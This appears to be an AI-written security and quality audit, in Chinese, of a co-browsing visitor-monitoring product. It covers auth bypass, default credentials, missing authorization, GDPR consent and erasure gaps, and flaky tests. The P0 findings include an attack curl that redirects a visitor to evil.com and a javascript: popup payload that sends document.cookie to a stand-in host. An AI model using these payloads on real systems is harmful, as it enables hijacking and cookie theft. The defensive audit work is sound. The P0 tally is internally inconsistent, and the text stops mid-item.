# 全栈深度审计:marketing-monitor v1 交付物

**审计时间**：2026-06-18
**审计范围**：v1 全部交付物(server 38 Go 文件 + admin 22 Vue/TS + visitor-sdk 17 TS + e2e 10 spec + DB migrations + Dockerfile/CI/compose + 全部 docs/Markdown)
**审计员**：Claude(grill-me 共识达成后,6 维并行 subagent + 主线交叉验证)
**审计方法**：静态阅读 + 跑 `go test ./...`、`go vet`、`go build`、`grep/find` 验证 + 跨 agent 去重
**审计交付物**：本报告(不修改业务代码、不修改 project-status.md)
**严重虚标免责**：本文发现的"badge 虚标"仅作建议,是否降级由用户决定

---

## 0. Executive Summary

**结论先行**:**当前 v1 代码不可直接上生产**。

12 个 P0 阻断中,最严重的 3 个构成完整接管链:
1. **`SERVER_ENV=dev` 是配置默认值**,忘配时所有 protected 端点对匿名完全开放(`middleware.go:17-23`、`config.go:19`)
2. **默认 admin 凭据 `admin@marketing-monitor.local / changeme123`** 在 users 表为空时 silent seed(`config.go:24-25`、`main.go:135-153`)
3. **command/chat/claim 端点提取了 `user_id` 但完全不用于权限校验**,任何认证用户可对任意 session 下发 navigate/fill_input/chat(`command.go:71-147`、`chat.go:85-141`、`claim.go:37-67`)

GDPR 合规上 v1 **不合规**(按键监听无 consent、无 erasure 端点、GC 只清 1/5 表),在欧盟/加州部署即违法。

深度 badge 方面,**project-status.md §5 声称 🟢 verified-deep ×9 中 7 个虚标**(实际深度 🟡),仅 1d / 1j 真到 🟢。

文档层 README/docs/README/1j 报告 三处独立严重虚标"v1 已完成",与 1h-ui 未启动、1h-backend 🔴 矛盾。

总发现 **80 条**(P0: 13 / P1: 27 / P2: 26 / P3: 14),已与 project-status.md §6 已知风险去重;§6 未列出的**新风险 60+ 条**。

---

## 1. 统计

| 维度 | 文件数 | 发现 | P0 | P1 | P2 | P3 |
|---|---|---|---|---|---|---|
| 代码质量 | 87 | 27 | 0 | 8 | 14 | 5 |
| 安全 + 合规 | 22 | 18 | 5 | 7 | 4 | 2 |
| 测试深度 | 10 切片 | 13 | 2 | 4 | 4 | 3 |
| 生产就绪 | 30 | 21 | 4 | 8 | 6 | 3 |
| LLM 可改写性 | 87 | 23 | 4 | 7 | 8 | 4 |
| 文档一致性 | 31 | 33 | 4 | 11 | 12 | 6 |
| **去重后总计** | — | **80** | **13** | **27** | **26** | **14** |

**Badge 一致性核对**:
- ✅ 一致:2(1d, 1j)
- ⚠️ 虚标(claim 🟢 实际 🟡):7(1a, 1b, 1c, 1e, 1f, 1g, 1i)
- 🚨 严重虚标(claim 🟢 实际 🟢 但关键测试 FAIL):1i(双重虚标)
- 准确:1(1h,自承 🔴 spec partial)

**Go 测试当前状态**:
- `go test ./... -count=1` → **FAIL**(antiscrape 包 `TestRateLimitMiddleware_Triggers429`)
- 单独跑该测试 → PASS(说明是包内测试间状态泄露,flaky)
- 5 个包零单测:`api / config / logging / storage / cmd`

---

## 2. P0(阻断生产 / 安全 / 严重虚标)

### [P0-1 CWE-306] `SERVER_ENV=dev` 默认值 + AuthMiddleware dev bypass
- **文件**:`server/internal/config/config.go:19`、`server/internal/api/middleware.go:17-23`、`server/internal/api/router.go:103`
- **问题**:`Config.Env` 默认 `dev`;`AuthMiddleware(..., opts.Env != "prod")` 非 prod 模式注入 `uuid.Nil` 作 user_id,**跳过所有 session 校验**。任何直接 `go run`/`./server`/裸 Docker 启动都默认走此路径。
- **影响**:运营忘配 env → 任何外部 IP 可拉全部访客录像、推任意 co-browsing 命令(navigate 到钓鱼站)、注入任意聊天、claim 任意访客。等同 zero-click 远程完整接管。
- **攻击场景复现**(deploy 后):
  ```bash
  curl -X POST http://host:8080/api/sessions/<any-id>/command \
    -H 'Content-Type: application/json' \
    -d '{"type":"navigate","payload":{"url":"https://evil.com"}}'   # 200 OK
  ```
- **修复方向**:
  1. 默认值改 `prod`(fail-secure);显式 opt-in `dev`/`test` 才绕过
  2. dev bypass 代码移到 `//go:build !release` 编译 tag 下,Dockerfile release 二进制不可能再走 dev 分支
  3. 启动时若 `Env==dev` 且监听非 `127.0.0.1` → panic

### [P0-2 CWE-916/CWE-522] 默认 admin `changeme123` + silent seed
- **文件**:`server/internal/config/config.go:24-25`、`server/cmd/server/main.go:135-153`
- **问题**:`AdminEmail` 默认 `admin@marketing-monitor.local`,`AdminPassword` 默认 `changeme123`。`seedAdminUser` 在 users 表为空时自动建管理员,**无任何强制改密**。`.env.example` 未列出此变量。
- **影响**:任何默认部署上线 → 攻击者用文档化默认凭据直接登录获 admin。
- **修复方向**:
  1. `Env=="prod"` 时若 `AdminPassword=="changeme123"` → `os.Exit(1)`
  2. `.env.example` 显式列出 `ADMIN_EMAIL`/`ADMIN_PASSWORD` 标"生产必改"
  3. 首次登录强制跳改密页 + DB `must_change_password=true`

### [P0-3 CWE-639/CWE-285] command/chat/claim 端点无 user_id 授权校验
- **文件**:`server/internal/api/command.go:71-147`、`server/internal/api/chat.go:85-141`、`server/internal/api/claim.go:37-67`
- **问题**:三个 handler 仅从 cookie 提取 `user_id` 注入 ctx,**完全不使用**做权限校验。任何登录 operator 可对任意 session_id(包括非自己 claim 的)下发 `fill_input`/`navigate`/`click`;`chat.go` 还接收 client 提供的 `sender` 字段写入 PG,**可伪造 `sender=visitor` 写入访客侧历史**(伪造客户证言/审计污染)。`command.go:117` 把 `c.ClientIP()` 当 `operator_id` 写审计表,字段语义错。
- **影响**:1:1 锁定(START.md/PLAN.md 明示)被绕过;审计完整性失守;多运营场景横向越权。
- **攻击场景**:运营 B 监控中,运营 A 直接 `POST /api/sessions/B的访客/command {fill_input password_field stolen}`。
- **修复方向**:
  1. 三个 handler 读 `c.Get("user_id")` 校验非 Nil
  2. `command.go` `OperatorID` 必须用 `user_id.UUID().String()` 而非 `c.ClientIP()`
  3. `claim.go` 在每次 postCommand/postMessage/listMessages 调用前校验 Redis `claim:session:{id}` 的 UID 等于当前 user_id
  4. `chat.go` 去掉客户端可控的 `sender` 字段,服务端按认证上下文决定

### [P0-4 CWE-362] claim TOCTOU race + `fmt.Sscanf` 解析 UUID 错误
- **文件**:`server/internal/api/claim.go:53-66`
- **问题**:
  1. **TOCTOU**:`claim` 先 `Get` 检查 existing,再 `Set`,非原子。两个并发 POST 都读到 `existing == nil` 都成功 `Set`,后写覆盖前。Redis 未用 `SET ... NX` 或 Lua。
  2. **UUID 解析错**:`fmt.Sscanf(string(existing), "%s", &existingUID)` 把 UUID 当字符串扫进 `uuid.UUID`(16 字节数组),`%s` 对 UUID 的写入行为未定义,实际几乎总写失败 → `existingUID` 保持零值 → `existingUID != uid` 几乎总 true → 任何持有 stale claim 的人都能"看上去匹配失败 → claim 抢占成功"。
- **影响**:违反 START.md/PLAN.md "1:1 锁定";录像混乱;责任不清。
- **修复方向**:
  1. `claim` 改用 `SET claim:session:{id} {uid} NX EX 300`;NX 失败返回 409 + 比对 existing UID
  2. UUID 改用 `uuid.Parse(string(existing))`(与项目其他位置一致)
  3. `release` 必须校验 caller UID 与 Redis 中的 UID 一致(防误释放他人锁)

### [P0-5 GDPR Art.7/Art.22 + CWE-359] 访客按键监听无 consent 流程
- **文件**:`visitor-sdk/src/commands/handler.ts:217-238`、`visitor-sdk/src/index.ts`(SDK 启动即 `attachKeyboard()` 全局 keydown)、`PLAN.md §10`、`CLAUDE.md`("按键监听在 GDPR/CCPA 下属敏感处理")
- **问题**:SDK 一加载,`attachKeyboard` 全局监听所有 `keydown` + 完整 DOM 录像 + IP/UA/地理位置。**无任何 consent UI / banner / opt-in**;SDK 也无公开 API 让集成方声明 consent。等同 keyboard logger。
- **影响**:GDPR Art.7(同意)/Art.22(自动化决策)与 CCPA 都要求"明确、自由、可撤回"同意 + 通知。在欧盟部署最高 4% 全球营收或 2000 万欧元罚款;CCPA 下访客 opt-out 权无任何实现。
- **修复方向**:
  1. SDK 默认 `consent: false` 不启动采集;集成方调 `mm.setConsent(true)` 才启动
  2. SDK 提供 `consentBanner` 默认 UI(可关),记 consent timestamp + 版本到 PG
  3. 后端加 `POST /api/privacy/consent`;replay/导出端点过滤未同意 session
  4. 写 `docs/privacy/gdpr-consent-flow.md` 描述部署方义务

### [P0-6 GDPR Art.17 + CWE-1188] 缺失 erasure 接口 + GC 只清 event_blobs
- **文件**:`server/internal/recording/gc.go:91-130`(只删 event_blobs)、`server/internal/storage/queries.go`(无 DeleteVisitor/CascadeDelete)、`PLAN.md §10`
- **问题**:GC 每小时跑但只删 `event_blobs.created_at < threshold`。`sessions`/`visitors`/`chat_messages`/`co_browsing_commands` **永不被清**。无任何 GDPR 删除端点(grep `gdpr`/`DeleteVisitor`/`right_to_be_forgotten` 零命中)。
- **影响**:GDPR Art.17(被遗忘权)违规;CCPA 删除请求违规;数据无限增长成本失控。
- **修复方向**:
  1. 加 `DELETE /api/privacy/visitor/:fingerprint` 端点:级联删 visitors + sessions + chat_messages + co_browsing_commands + event_blobs + MinIO 对象 + Redis flagged/stream/snapshot keys
  2. GC 扩展:chat_messages / co_browsing_commands / sessions / visitors 也按 retention 清
  3. `docs/privacy/retention.md` 文档化保留策略

### [P0-7 CWE-1004/CWE-799] docker-compose prod profile 回退到 dev 凭证
- **文件**:`docker-compose.yml:23,24,56,57,83-89`
- **问题**:prod profile 的 `PG_PASSWORD:-mm_dev`、`MINIO_SECRET_KEY:-mm_dev_secret` —— 部署者忘 set 时生产 PG/MinIO 用 dev 弱凭证。这些值已在公开 `.env.example`。
- **影响**:任何看到 repo 的攻击者拿到 prod 凭证。
- **修复方向**:prod profile 用 `${PG_PASSWORD:?PG_PASSWORD required}`(必填语法),缺失变量时拒绝启动。

### [P0-8 CWE-1321/CWE-79] popup `action_url` 可注入 `javascript:` URL
- **文件**:`visitor-sdk/src/ui/popup.ts:39-45`(`btn.href = p.action_url` 直接赋值)、`server/internal/api/command.go`(只 navigate 做白名单,show_popup 不做)
- **问题**:`show_popup` 的 `action_url` 直接赋给 `<a>` 的 href。运营(或 dev 模式匿名)可发 `action_url: "javascript:fetch('https://evil/?c='+document.cookie)"`,访客点击即执行 JS。
- **影响**:visitor 端任意 JS 执行,等同被运营(或绕过认证的攻击者)控设备。
- **修复方向**:
  1. `popup.ts` 接收时校验 `^https?:` 开头
  2. 后端 `buildCommandPayload` 对 `show_popup` 也走 `isURLAllowed` 白名单

### [P0-9] 1i badge 严重虚标:关键负向测试 `TestRateLimitMiddleware_Triggers429` 当前 FAIL
- **文件**:`server/internal/antiscrape/ratelimit_test.go:30-77`
- **验证**:`go test ./internal/antiscrape/ -count=1 -v` 实测输出:
  ```
  === RUN   TestRateLimitMiddleware_Triggers429
      ratelimit_test.go:59: request 1: expected 200, got 429
  --- FAIL: TestRateLimitMiddleware_Triggers429 (0.00s)
  FAIL
  ```
- **根因**:`ratelimit_test.go:35` 用 `fmt.Sprintf("10.99.99.%d", time.Now().UnixNano()%200+1)` 生成 unique IP,只 1-200 范围;同包其他测试(BehaviorTracker / UA)先跑过消耗了同 Redis bucket,后续 5 次配额已用完。`go test -run TestRateLimitMiddleware_Triggers429 -v` 单独跑 PASS,但 `go test ./internal/antiscrape/` 全包跑 FAIL。
- **影响**:1i 🟢 badge 的核心负向证据**不可重复运行**,违反 `docs/standards/verification-depth.md` §1.3 🟢 必备条件"可重复运行"。CI 若用 `go test ./...` 会 FAIL,但项目当前 CI 是否跑此测试需另查。
- **实际深度**:🟡
- **修复方向**:
  1. unique IP 用 `crypto/rand` 或 UUID 派生,不用 `%200`
  2. 测试 setup 加 `rdb.FlushDB(ctx)`
  3. CI 必须跑 `go test ./... -count=1` 守底

### [P0-10] README 严重虚标 v1 已完成
- **文件**:`README.md:8, 17`
- **问题**:L8 "v1 已完成 — 全部 10 个切片交付" + L17 "认证 + 多运营 claim/release 锁 ✅"
- **真实**:`project-status.md §5/§6` 明确 1h 拆为 1h-backend(🔴) + 1h-ui(⏳ 未启动),LoginView/Vue Router 守卫完全未实施
- **影响**:新用户/LLM 读 README 误以为产品已交付完整认证。配合 P0-1(SERVER_ENV=dev bypass),用户按 README 部署后实际是"无登录页 + dev mode 完全开放"。
- **修复方向**:L8 改"v1 主干已交付,1h-ui 登录 UI 待补";L17 加 "(后端 claim/release 已实施,前端 LoginView 待 1h-ui 切片)"

### [P0-11] docs/README.md badge 表严重过期
- **文件**:`docs/README.md:37-39`
- **问题**:切片报告索引表标 `1h 🟡 / 1i 🟡 / 1j 🔴`,而 `project-status.md §5` 实际是 `1h 🔴 / 1i 🟢 / 1j 🟢`
- **影响**:LLM 进入 docs/ 索引页读到错误深度分布,基于错误假设做后续判断
- **修复方向**:同步为 `1h 🔴 / 1i 🟢 / 1j 🟢`,或删该列只留指向 project-status.md 的链接

### [P0-12] 1j impl 报告 v1 总结表虚标 1h 为 ✅
- **文件**:`docs/reports/completed/2026-06-17-slice-1j-implementation.md:60, 67`
- **问题**:L57-70 "v1 完成总结"表标 "1h 认证 + 多运营 | 4 | ✅";而 1h 自己的报告 L3-12 已声明 🔴 spec partial
- **影响**:跨报告自相矛盾;LLM 在报告间跳转时被 1j 误导
- **修复方向**:1j 报告 v1 总结表加 disclaimer "状态以各切片自身 impl 报告 badge 为准",或改 1h 行为 🔴 + 注脚

### [P0-13] `migrate-down` DROP TABLE 无保护
- **文件**:`server/migrations/000001_init.down.sql`、`000002_cobrowsing.down.sql`、`000003_chat.down.sql`、`000004_auth.down.sql`、`Makefile:132-136`
- **问题**:所有 down 都是 `DROP TABLE IF EXISTS xxx;` —— 生产环境一旦运维误执行 `make migrate-down` 或 `migrate down 1`,该表及数据完全丢失且不可恢复。无任何 dry-run、无 schema 备份提示、无破坏性操作确认。
- **影响**:生产数据库灾难性数据丢失。
- **修复方向**:
  1. down SQL 改为"软回滚"或仅删增量 schema
  2. `make migrate-down` 加 prompt 确认
  3. README 明确警告"生产禁用 down,只允许 up"
  4. down 前自动 `pg_dump` 备份

### [P0-14] `schema_migrations` + `migrate` CLI 在部署路径从未使用
- **文件**:`Makefile:132-136`、`.github/workflows/ci.yml:138-142`、`server/cmd/server/main.go`(启动不跑 migrations)
- **问题**:
  - Makefile `migrate-up/down` 用 golang-migrate CLI(会建 schema_migrations 表)
  - 但 CI `compose-smoke` 是 `for f in ...; psql -f`,docker-compose 启动后无自动 migrate
  - 服务启动 `main.go` 也不跑 migrations
  - dev 数据库**无 schema_migrations 表**
- **影响**:
  - 新生产部署:用户必须手动跑 `make migrate-up`,若环境无 `migrate` CLI(需 `make install-tools`)会卡住
  - 用户不知道当前 migration 版本
  - 多实例运行无锁,并发跑 migrations 数据竞争
- **修复方向**:
  1. migrations embed 进二进制(`go:embed migrations/*.sql`)+ 启动时自动 `migrate up`
  2. 或 docker-compose/Dockerfile entrypoint 显式跑 migrations
  3. CI compose-smoke 改用 `migrate` CLI 验证 down/up 循环

---

## 3. P1(必修)

### 安全类

#### [P1-1 CWE-916] bcrypt cost = DefaultCost(10) < 项目要求 ≥ 12
- **文件**:`server/cmd/server/main.go:143`
- **修复**:`bcrypt.GenerateFromPassword(..., 12)` 或新增 `BCRYPT_COST` env 默认 12

#### [P1-2 CWE-613/CWE-384] session cookie `Secure: false`
- **文件**:`server/internal/api/auth.go:87,107`
- **问题**:HTTP 连接下 cookie 明文传输;SameSite=Lax 允许 top-level GET 携带,WS upgrade 是 GET,理论可被 CSWSH。
- **修复**:`Secure: cfg.Env == "prod"`;WS upgrade 加 CSRF token(双提交 cookie 或 Origin 强校验)

#### [P1-3 CWE-307] 登录无 brute-force 防护
- **文件**:`server/internal/api/auth.go:51-97`
- **修复**:登录失败 5 次/15 分钟锁定该 email + 该 IP,Redis 计数 + 指数退避

#### [P1-4 CWE-770] 访客 WS 无消息率/总量限制(DoS)
- **文件**:`server/internal/api/ws.go:197-251`(read loop 无 per-visitor 上报频率限制)
- **问题**:read loop 仅设单条 1MiB 上限,无每秒/分钟消息数限制,无 total-bytes-per-session 上限。恶意 SDK 可发大量 1MiB 消息撑爆 Redis Stream + MinIO。`session/init` 也无限制可任意创建 session 行撑爆 PG。
- **修复**:per-session token bucket(per 10s 内最多 N 条 envelope、累计 ≤ X MiB),超限 force close + FlagSession

#### [P1-5 CWE-693] gin 未配置 TrustedProxies → rate limit 可被 X-Forwarded-For 绕过
- **文件**:`server/internal/api/router.go:58-60`、`server/internal/antiscrape/ratelimit.go:35`
- **问题**:`r := gin.New()` 后无 `SetTrustedProxies(...)`。`ratelimit.go:35` 用 `c.ClientIP()` 当 key,ClientIP 信任 X-Forwarded-For,攻击者每个请求伪造不同 X-Forwarded-For 获得无限请求预算。
- **影响**:PLAN.md §5 把"反爬虫"标为"一等公民",rate limit 在反向代理后完全失效。
- **修复**:`r.SetTrustedProxies([]string{...})` 只信任已知反代 CIDR;文档要求生产必经 trusted reverse proxy 配 `X-Real-IP`

#### [P1-6] WS WriteTimeout 30s 强制断开所有长连接
- **文件**:`server/cmd/server/main.go:107`、`server/internal/api/ws.go:62,262`
- **问题**:`http.Server{WriteTimeout: 30 * time.Second}` 适用于所有连接包括 WS。`net/http` 的 WriteTimeout 是 "request header 读完到 response body 写完"的总时间,WS 长连接 30s 后强制关。coder/websocket 文档明确警告 "WriteTimeout must be 0 for WebSocket"。
- **影响**:生产中所有 WS 客户端每 30s 被踢一次,体验差 + 重连风暴。
- **修复**:`WriteTimeout: 0`(或单独为 WS 路由 wrap hijacked handler)

#### [P1-7] flushSession 跨 MinIO/PG 无事务 → 孤儿对象
- **文件**:`server/internal/recording/stream.go:280-298`
- **问题**:`PutObject` 成功后若 `CreateEventBlob` 失败,MinIO 留下"孤儿对象"永远无人引用也无人清。反之 PG 写成功 XTRIM 失败 → 重复 flush 再次 PutObject + 写 PG。
- **影响**:30 天 × 500 并发 × 1000 events/blob ≈ 大量孤儿对象,MinIO 存储成本失控(PLAN.md §10 已识别此风险)。
- **修复**:PG 事务里写 event_blobs,提交后再 XTRIM;PutObject 失败重试或丢弃 stream entries + 告警;GC worker 加"扫描 MinIO 中 PG 未引用对象"兜底

#### [P1-8] operator WS 的 sub goroutine 泄漏(代码注释自承)
- **文件**:`server/internal/api/ws.go:344-366`
- **问题**:`restartSubs()` 每次 subscribe 新增 forwarder goroutine,注释"真实实现需要仔细管理 goroutine 生命周期(1b 简化)"。`subs[sid].ch` 标记 nil 但 ch 本身未关,goroutine 永远阻塞在 `for msg := range ch`。运营反复 subscribe/unsubscribe 累积泄漏。
- **影响**:运营 admin 长连接数小时后 goroutine 数持续增长,内存/fd 泄漏。
- **修复**:`activeSub` 加 `done chan struct{}`,unsubscribe 时关闭;或 `context.WithCancel` 显式管理

#### [P1-9 CWE-311] PG DSN 硬编码 `sslmode=disable`
- **文件**:`server/internal/config/config.go:47`
- **问题**:完全无法配置。跨主机部署时凭证与访客数据明文走网络。
- **修复**:加 `PG_SSLMODE` env(默认 `prefer`),允许 `require`/`verify-full`

### 测试深度类

#### [P1-10] 7 切片 🟢 badge 应降级 🟡
- **切片**:1a / 1b / 1c / 1e / 1f / 1g / 1i
- **修复方向**:见 §5 "Badge 虚标汇总"

#### [P1-11] 1e/1f/1g 全部 e2e 场景含静默跳过模式
- **文件**:`e2e/tests/1e-cobrowse.spec.ts:64, 86, 130`、`e2e/tests/1f-form-navigate.spec.ts:20, 40, 60, 80`、`e2e/tests/1g-chat.spec.ts:20, 54, 78, 107`、`e2e/tests/1h-auth.spec.ts:30`
- **问题**:`if (!sessions.sessions.length) return;` 模式 —— 前置 sessions 为空时测试静默 pass。`docs/standards/verification-depth.md §1.3` 明确"含静默跳过模式 → 自动降级 🟡"。**1f 和 1g 是全部 4 个场景**都含此模式,环境出问题整套 e2e vacuous pass。
- **修复**:
  1. 替换为 `expect(sessions.sessions.length).toBeGreaterThan(0)` 让前置真失败
  2. beforeEach 加 fixture:启动 visitor、等 WS 上线、断言在 list 内,再进测试体

#### [P1-12] 1b spec 验收要求的 SDK 重连 / MinIO checksum 在 e2e 完全未验证
- **文件**:`e2e/tests/1b-realtime.spec.ts:70-98`
- **问题**:spec(2026-06-17-slice-1b-spec.md L26-27, 318-327) 要求场景3 验证"SDK 指数退避重连 + session_id 复用 + buffer 中事件被发出"、场景4 验证"`mc ls` + `SELECT event_blobs` + `sha256sum` 比对"。实际场景3 只调 `/healthz`,场景4 只调 `/api/sessions`,**重连逻辑、MinIO blob、checksum 全部未触达**。
- **修复**:加 testcontainers 集成测试覆盖 WS 断开/重连/session 复用;e2e 场景4 改 docker exec minio mc ls + psql 查 event_blobs + 算 sha256,如 1i 场景3 的 psqlQuery 模式

#### [P1-13] 1c 脱敏测试 vacuous truth
- **文件**:`e2e/tests/1c-rrweb.spec.ts:70-97`
- **问题**:输入 `SECRET_VALUE_12345` 后断言 `expect(adminText).not.toContain('SECRET_VALUE_12345')`,但 rrweb-player 在 iframe 内,admin body 取不到 iframe 内容,断言**永远通过**(就算脱敏失效也通过)。spec 验收(1c-spec.md L27)明确要求"脱敏验证"。
- **修复**:`admin.frameLocator('.replay-area iframe').locator('body').textContent()`,或用 CDP 抓 admin 端 WS envelope bytes 反序列化校验

#### [P1-14] 1e 验收 spec 4 个场景,e2e 实际 5 个但深度不足
- **文件**:`e2e/tests/1e-cobrowse.spec.ts`
- **问题**:
  - 场景1 cursor_highlight 注释自承"不强制 cursorCount > 0",只验 `cmdResp.ok()`,**未真验证访客端 SVG 光标渲染**
  - 场景4 ESC 紧急退出只验"无 pageerror",**未验证紧急退出真生效**(spec L25 要求)
  - 场景5 审计 PG 表注释自承"MVP 跳过",**未真查 `co_browsing_commands` 表**
- **修复**:如 1i 场景3 用 psqlQuery 模式查 `co_browsing_commands` 表;ESC 测试应断言 visitor 端控制层真关闭

### 可观测性类

#### [P1-15] CLAUDE.md "可观测性开发" 合规度 ~25%
- **文件**:`server/internal/logging/{middleware,handler}.go`
- **问题**:CLAUDE.md 明确要求 LifecycleTracker 装饰器、Function_Start/End/Branch event_type、Execution Trace Report。**全 server/admin/sdk 0 命中**(grep `LifecycleTracker|Function_Start|event_type` 全空)。`handler.go:5` 注释承诺字段含 `event_type` 但实际调用 0 次。
- **影响**:排查生产事故只能靠请求级 `slog.Info`,跨 goroutine 完全黑盒。CLAUDE.md 是项目指南一等公民,合规度 <30%。
- **修复方向**:实现 `observability.Lifecycle(ctx, name)` 装饰器;至少在 visitor WS read loop / flushSession / gc.runOnce 加 Point 埋点

#### [P1-16] trace_id 覆盖率 ~30% — WS/Flusher/GC 全断
- **文件**:`server/internal/logging/middleware.go:34-39`(仅 HTTP)、`server/internal/api/ws.go:175,181`(用 `context.Background()` 新建)、`server/internal/recording/{stream,gc}.go`(后台 ticker goroutine)
- **问题**:HTTP 请求经 TraceMiddleware 注入 trace_id(OK);但 WS handler 的 defer 清理用 `context.Background()` 新建,trace_id 完全丢失;Flusher.tick / GC.runOnce ctx 来自 rootCtx,无 trace_id/span_id。
- **影响**:生产中排查"为何 session X 的录像在第 5 个 blob 后停止 flush"完全无 trace,日志只能按时间线肉眼拼接。
- **修复**:WS 接受请求时生成 session-scoped logger,派生 goroutine 通过 ctx 传播;Flusher.tick 每 session 生成子 span

### LLM 可改写性类

#### [P1-17] CLAUDE.md 第 39 行明确要求 `IMPLEMENTATION_PLAN.md`,但文件不存在
- **文件**:项目根(应存在)
- **问题**:CLAUDE.md 第 39 行原文"通过 `IMPLEMENTATION_PLAN.md` 和小步提交让模型理解上下文、意图与边界"—— 全仓 `find . -name "IMPLEMENTATION_PLAN*"` 0 命中。LLM 进入新会话无"当前正在做什么"pointer,只能靠 `docs/project-status.md §7`,但 §7 是已完成阶段("B ✅ / A ✅"),下一步"C 设计漏洞"未展开。
- **修复**:项目根建 `IMPLEMENTATION_PLAN.md`,含当前切片(1h-ui 或 C 阶段)目标/边界/验收/依赖/风险

#### [P1-18] 三方 proto 手写同步,无 codegen,admin 缺 command.ts
- **文件**:`server/internal/proto/{events,envelope}.go`、`visitor-sdk/src/proto/{events,envelope,command}.ts`、`admin/src/proto/{events,envelope}.ts`
- **问题**:
  - `Envelope.Payload` 三方都是 `any`/`unknown`,无 discriminated union
  - `visitor-sdk/src/proto/envelope.ts` 与 `admin/src/proto/envelope.ts` **byte-identical**(`diff` 验证),重复代码而非共享 package
  - `admin/src/proto/` 缺 `command.ts`(SDK 有)—— LLM 改命令协议时易漏 admin 端
  - Go `CommandPayload.Type string` 弱约束 vs TS literal union 强约束,两边强度不对等
- **修复**:建 `packages/proto/` 共享包,三方 import;或写生成脚本(单一 schema → Go+TS)

#### [P1-19] 变更安全策略(原则 7)零落地
- **文件**:`/backup` 目录应存在;rollback 流程文档应存在
- **问题**:
  - `find . -type d -name "backup"` 0 命中
  - `docs/standards/` 只有 naming-conventions / doc-structure / verification-depth,无"批量变更安全策略"
  - `server/internal/storage/queries.go:1-6` 注释"sqlc 安装失败手写"—— 这正是原则 7 场景,但无 backup 痕迹、无 rollback 记录
  - `server/internal/api/ws.go:435 isFullSnapshotEnvelope` 注释"已废弃:用 extractFullSnapshotEnvelope 替代"但函数仍保留 —— 无删除时间表,变成永久死代码
- **修复**:`docs/standards/` 加 `change-safety.md`:批量改动前如何备份、错误数阈值多少触发 rollback、废弃函数多久删除

#### [P1-20] 命名规范文档与实际代码脱节
- **文件**:`docs/standards/naming-conventions.md §4` vs 全 server
- **问题**:文档列 7 类前缀(parseXxx/safeXxx/assertXxx/createXxx/withXxx/isXxx/mustXxx),但实际全 server 命中 <5%。实际命名 `extractXY`、`extractRRWebEventsFromPayload`、`scanVisitor`、`buildCommandPayload` 等混杂。Go 惯例 `New*` 与文档要求 `create*` 冲突,未说明哪个为准。
- **修复**:改文档承认 `New*` 是 Go 惯例、`create*` 是 TS 惯例(成本低);或全重命名

#### [P1-21] Envelope.TraceID 是 dead field(WS 链路 trace_id 断裂)
- **文件**:`server/internal/proto/envelope.go:37`(定义)、`server/internal/api/ws.go`、`visitor-sdk/src/transport/ws.ts`
- **问题**:`Envelope.TraceID` 字段定义但 server/internal 内 `.TraceID` **0 次**读或写。SDK 不构造 trace_id;server 用 HTTP middleware 的 trace_id 而忽略 envelope 自带;下行 envelope 不带 trace_id。WS 链路 trace_id 完全断。
- **修复**:SDK 发 envelope 时生成 trace_id;server 在 `proto.Decode` 后写回 ctx;下行 envelope 透传

#### [P1-22] `admin/src/utils/time.ts` 硬编码中文(违反 i18n day 1)
- **文件**:`admin/src/utils/time.ts:5-10`
- **问题**:`return '刚刚'`、`return ${Math.round(diff / 1000)} 秒前` 等 4 处中文。1j 抽 i18n 时漏。
- **修复**:抽 `formatRelative` 文案为 i18n key(`time.just_now`/`time.seconds_ago`)

#### [P1-23] SDK 端硬编码中文
- **文件**:`visitor-sdk/src/commands/handler.ts:166`(`'运营员'`、`'字段'`)、`visitor-sdk/src/ui/chatWidget.ts:74,105,118,121`(`'客服'`、`'输入消息...'`、`'发送'`)
- **问题**:PLAN.md §5 "i18n from day 1" 仅约束 admin,但 SDK 字符串访客英文用户也看到中文。
- **修复**:SDK config 暴露 `messages?: {...}` 让接入方覆盖;或 SDK 引轻量 i18n

### 代码质量类

#### [P1-24] `claim.go` 用 `fmt.Sscanf` 解析 UUID(同 P0-4,代码层独立列)
- **文件**:`server/internal/api/claim.go:57`
- **问题**:`%s` 对 `uuid.UUID`(16 字节数组)的写入行为未定义,实际几乎总失败,后续 `existingUID != uid` 几乎总 true。
- **修复**:改用 `uuid.Parse(string(existing))`

#### [P1-25] e2e/helpers/ 整目录死代码
- **文件**:`e2e/tests/helpers/setup.ts`(41 行)、`e2e/tests/helpers/selectors.ts`(11 行)
- **问题**:4 个 helper 函数和 `Sel` 对象,无 spec import。10 个 spec 各自 copy-paste 同模板。
- **修复**:删除 helpers,或把 10 个 spec 改为引用(推荐后者,少 ~150 行重复)

#### [P1-26] `room.publish` 注释承诺"带日志"但实际静默丢弃
- **文件**:`server/internal/hub/room.go:7,39-49,74-83`
- **问题**:注释"满了 publish 会丢弃(带日志)",但 `SessionChan.publish` 与 `TenantRoom.publish` 的 `default:` 分支无任何日志。订阅者消费慢时事件被静默吞掉。
- **修复**:在 default 分支加 `sc.logger.Warn(...)`,需把 logger 注入 SessionChan/TenantRoom

#### [P1-27] god files: `queries.go` 569 / `ws.go` 529 / `router.go` 287
- **文件**:`server/internal/storage/queries.go`、`server/internal/api/ws.go`、`server/internal/api/router.go`
- **问题**:违反 CLAUDE.md 原则 2(单一职责)。`queries.go` 22 方法全在 `*Postgres`(按表/聚合根应拆 visitor_repo.go / session_repo.go 等);`ws.go` 混合 visitor WS + operator WS + 4 envelope helper;`router.go` 混合路由 + 反爬组装 + static + SPA fallback。
- **修复**:按职责拆文件;引入 `Repository` interface 让 api 包依赖接口

#### [P1-28 死代码集中清理] 6+ 处死代码未清
- `server/internal/api/router.go:136` — `NewRouter` 标 Deprecated 但保留
- `server/internal/api/ws.go:435` — `isFullSnapshotEnvelope` 自标"已废弃"实际零引用
- `server/internal/api/ws.go:30,43` — `pingEvery` 字段赋值后从不读取(无 ping 实现)
- `server/internal/recording/stream.go:192` — `FlushSessionNow` 全仓零调用
- `server/internal/antiscrape/ratelimit.go:140` — `IsSessionFlagged` 零调用(配合 P1-29)
- `server/internal/storage/queries.go:100,138,373` — `GetVisitorByFingerprint`、`TouchVisitor`、`CountEventBlobsBySession` 零调用
- `server/internal/storage/minio.go:18,44` — `MinIO.logger` 字段写入后从不使用
- **修复**:全删,或为 `IsSessionFlagged` 接入路由层(见 P1-29)

#### [P1-29] `IsSessionFlagged` 实现但零调用 → BehaviorTracker 是死循环
- **文件**:`server/internal/antiscrape/ratelimit.go:140-150`
